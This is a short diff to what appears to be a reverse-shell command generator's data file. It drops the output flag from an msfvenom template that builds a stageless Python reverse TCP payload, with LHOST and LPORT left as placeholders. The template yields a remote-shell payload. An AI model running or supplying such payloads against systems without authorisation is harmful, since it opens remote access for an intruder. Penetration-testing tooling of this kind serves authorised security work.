@@ -440,7 +440,7 @@ const msfvenomCommands =  withCommandType(
         },
         {
             "name": "Python Stageless Reverse TCP",
-            "command": "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw -o shell.py",
+            "command": "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw",
             "meta": ["msfvenom", "windows", "linux", "stageless", "reverse"]
         },
         {
